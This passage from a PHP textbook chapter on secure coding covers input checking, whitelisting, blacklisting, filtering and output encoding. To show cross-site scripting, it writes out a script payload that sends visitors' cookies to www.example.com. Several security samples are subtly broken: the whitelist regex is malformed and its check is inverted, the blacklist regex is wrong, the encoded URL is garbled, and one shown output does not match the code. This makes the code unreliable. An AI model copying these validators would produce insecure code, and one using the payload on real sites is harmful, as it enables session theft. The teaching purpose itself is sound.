
## Chapter 20: Writing High-Quality Code

## Checking Input and Encoding Output

Many of the chapters throughout this book have emphasized the importance of security when writing PHP applications. Attacks on Web applications are very common, and if you write a popular application containing holes, it is only a matter of time before those holes are exploited. Attackers can then use your application to do nasty things, (but not limited to):

- Gaining access to usernames, passwords, sessions, and cookies
- Modifying or deleting data in your database
- Altering your Web site content (such as defacing your home page)
- Running external applications or manipulating files (such as /etc/passwd) on your Web server
- Taking over the Web server that hosts your application

Therefore it makes sense to eliminate or prevent security holes in your applications. The vast majority of holes in Web applications are caused by one (or both) of the following:

- Not properly checking data feed into the application
- Not properly encoding data in the application's output (typically the displayed Web page)

Here's a simple example of an insecure PHP script search.php:

```php
<?php
$searchQuery = $_GET['search'];
echo "You searched for: $searchQuery";
// (display search results here)
?>
```

This script engine reads the user-supplied search text from the search parameter, and redisplays the search text in the page (followed by the search results). For example, if the script was called with the URL

```
http://localhost/search.php?search=monkeys
```

the script would display for the following:

You searched for: monkeys

So far so good. What if the following URL is passed to the script?

```
http://localhost/search.php?search=%3Cscript%3EDocument.location.href=%3D27http%3A%2F%2Fwww.example.com%3Fstolencookies%3D27%2B%2Bdocument.cookie%3D%3C/script%3E
```

This URL might be in an email message sent to the visitor from an attacker. If the visitor clicks the link, the script will output the following output to the browser:

You searched for: <script>document.location.href='http://www.example.com?stolencookies=' + document.cookie</script>

In this example, the query string in the link contains some malicious JavaScript (encoded using URL encoding). The search engine script diligently includes the contents of the query string — that is, the malicious JavaScript — in the resulting Web page markup. Assuming the visitor's browser has JavaScript enabled, this will cause the browser to redirect to a server-side script on www.example.com, passing all of the visitor's cookies associated with the original site. The owner of www.example.com will have access to all the same visitor cookies as the original site. This might allow them to impersonate the visitor or hijack the visitor's login, for example. Such an attack is often called a cross-site scripting (XSS) attack.

Clearly this security hole is caused by the fact that the user input (the query string) is sent straight to the browser without encoding or decoding the supplied data.

Other types of attacks to watch out for include SQL injection (covered in Chapter 13) and CSRF (cross-site request forgery). Find out more on CSRF attacks at http://en.wikipedia.org/wiki/Cross-site_request_forgery.

## Checking Input

Your scripts should check all every input before using it. This includes data in query strings, cookies, and form submissions, data retrieved from other web page; data stored in database tables, and so on.

For example, the previously shown security hole could be plugged by checking the contents of the query string supplied by the:

```php
<?php

$searchQuery = $_GET['search'];

if (preg_match("/^[a-zA-Z0-9]*$"/, $searchQuery)) {
    echo "Invalid input: please use only letters and digits";
    exit;
}

echo "You searched for: " . $searchQuery;
// (display search results here)

?>
```

Here, a regular expression is used to terminate the script if the query string contains anything other than letters and digits. (In a real-world application) you would probably redisplay the search form, prompting the user to try again.)

This technique is known as whitelisting you only accept characters that match a whitelist (in this case, letters and digits). Alternatively, you can use blacklisting, where you reject characters that are not on a blacklist:

```php
if ( preg_match("/[^<>&%]*$"/, $searchQuery )) {
    echo "Invalid input: please don't use &lt; &gt; &amp; or %";
    exit;
}
```

Generally speaking, it's better to whitelist, if possible, because it's safer than blacklisting. Blacklisting, it's easy to forget to include a particular character in the blacklist, creating a potential security hole. Sometimes it's not possible or practical to use a whitelist, in which case a blacklist is the best approach.

Although regular expressions give you a lot of flexibility with checking input, you can use other techniques to make life easier. HTML Form (covered in Chapter 15) lets you use the PEAR Validate package (see `http://pear.php.net/package/Validate`) to validate input such as dates, email addresses, URLs, and so on.

An alternative to whitelisting is filtering. However, rather than checking that input doesn't contain malicious data (rejecting if it does), you remove any malicious data from the input, and proceed as normal:

```php
$searchQuery = $_GET['search'];
$searchQuery = preg_replace('/[^a-zA-Z0-9]/', "", $searchQuery);
echo "You searched for: " . $searchQuery;
// (display search results here)
?>
```

In this example, any characters that aren't letters or digits are removed from the query string before it is used. When the previous malicious query string is supplied, the script produces the following output:

You searched for:
scriptdocumentlocationhref://examplecomcookiesdocumentcookiescript

A variation on filtering is casting to ensure that the input is of the required type:

```php
$pageStart = (int) $_GET["pageStart"];
```

Filtering is often nicer from a user's perspective, because they don't have to deal with error messages or reentering data. However, because data is silently removed by the application, it can also lead to confusion for the user.

## Encoding Output

As well as validating or filtering all input to your script, it's a good idea to encode your output. This can help to prevent cross-script attacks, such as the one shown previously. With this approach, you can encode, or escape, unsafe characters using whatever mechanism is available to output the format you're working with.

```php
$searchQuery = $_GET['search'];
echo "You searched for: " . htmlspecialchars($searchQuery);
// (display search results here)
?>
```

## Handling Errors

Most of the time, your application will run as it was intended to do. However, occasionally something will go wrong, resulting in an error. For example:

- The user might enter an invalid value in a field
- The web server run out of disk space
- A file or database record that the application needs to read may not exist
- The application might not have permission to write to a file on the disk
- A service that the application needs to access might be temporarily unavailable

These types of errors are known as runtime errors, because they occur at the time the script runs. They are distinct from syntax errors, which are programming errors that need to be fixed before the script will run.

If your application is well written, it should handle the error condition, whatever it may be, in a graceful way. Usually this means informing the user (and possibly the developer) of the problem clearly and precisely.

In this section you learn how to use PHP's error handling functions, as well as Exception objects, to deal with errors gracefully.
